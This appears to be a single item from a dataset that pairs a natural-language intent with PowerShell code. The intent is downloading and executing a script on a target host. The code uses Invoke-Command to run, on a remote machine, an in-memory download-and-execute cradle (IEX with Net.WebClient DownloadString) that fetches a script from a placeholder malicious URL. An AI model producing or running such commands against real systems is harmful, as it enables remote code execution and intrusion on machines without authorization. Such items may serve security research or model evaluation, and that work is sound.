# Natural language intent:
# Download and execute a PowerShell script on a specified target host.

Invoke-Command -ComputerName TargetHost -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/sysRoot.ps1') }
